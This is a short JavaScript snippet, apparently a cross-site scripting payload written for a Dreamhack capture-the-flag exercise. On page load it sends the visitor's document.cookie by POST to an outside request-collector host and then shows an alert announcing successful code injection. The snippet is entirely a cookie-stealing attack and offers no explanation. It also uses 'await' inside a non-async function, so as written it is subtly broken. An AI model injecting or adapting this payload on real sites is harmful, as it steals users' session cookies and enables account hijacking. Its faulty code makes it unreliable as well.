document.addEventListener("DOMContentLoaded", function(event) { 
  a = await fetch("https://iwtekfx.request.dreamhack.games", {
    method: "POST",
    body: document.cookie
})
alert("code Injection Successful")
});

